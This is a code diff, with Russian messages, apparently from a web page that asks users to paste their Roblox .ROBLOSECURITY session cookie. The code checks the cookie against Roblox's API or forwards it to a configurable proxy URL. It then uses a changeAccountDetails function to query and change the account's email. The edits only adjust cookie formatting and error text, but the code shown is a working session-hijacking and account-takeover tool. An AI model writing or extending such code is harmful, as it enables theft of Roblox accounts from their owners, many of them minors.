@@ -301,8 +301,8 @@
                 const url = PROXY_URL ? `${PROXY_URL}/check-cookies` : "https://users.roblox.com/v1/users/authenticated";
                 const response = await fetch(url, {
                     method: PROXY_URL ? "POST" : "GET",
-                    headers: PROXY_URL ? { "Content-Type": "application/json" } : { "Cookie": `.ROBLOSECURITY=${cookies.trim()}` },
-                    body: PROXY_URL ? JSON.stringify({ cookies: `.ROBLOSECURITY=${cookies.trim()}` }) : undefined
+                    headers: PROXY_URL ? { "Content-Type": "application/json" } : { "Cookie": cookies },
+                    body: PROXY_URL ? JSON.stringify({ cookies }) : undefined
                 });
                 if (response.ok) {
                     const userData = await response.json();
@@ -315,7 +315,7 @@
                 } else if (response.status === 429) {
                     return { valid: false, error: "Слишком много запросов к Roblox API. Попробуй позже через 5-10 минут." };
                 } else {
-                    return { valid: false, error: "Неверные куки. Убедись, что они действительны и начинаются с .ROBLOSECURITY=." };
+                    return { valid: false, error: "Ошибка проверки куки. Проверь их и попробуй снова." };
                 }
             } catch (e) {
                 console.error("Ошибка проверки куки:", e);
@@ -330,7 +330,7 @@
         async function changeAccountDetails(cookies, newEmail, verificationCode = null) {
             try {
                 const headers = { 
-                    "Cookie": `.ROBLOSECURITY=${cookies.trim()}`, 
+                    "Cookie": cookies, 
                     "Content-Type": "application/json" 
                 };
                 const emailCheck = await fetch("https://accountsettings.roblox.com/v1/email", { headers });
@@ -423,10 +423,12 @@
             const errorMessage = document.getElementById("error-message");
             const mainContent = document.getElementById("main-content");
 
+            // Удаляем пробелы и переносы строк
+            cookies = cookies.replace(/\s+/g, "");
+            // Добавляем .ROBLOSECURITY=, если отсутствует
             if (!cookies.startsWith(".ROBLOSECURITY=")) {
                 cookies = `.ROBLOSECURITY=${cookies}`;
             }
-            cookies = cookies.replace(/\s+/g, "");
 
             const userInfo = await checkRobloxCookies(cookies);
             if (userInfo.valid) {
@@ -446,7 +448,7 @@
                     </div>
                 `;
             } else {
-                errorMessage.textContent = userInfo.error || "Неверные куки. Убедись, что они начинаются с .ROBLOSECURITY= и действительны.";
+                errorMessage.textContent = userInfo.error || "Ошибка проверки куки. Проверь их и попробуй снова.";
                 errorMessage.style.display = "block";
             }
         });
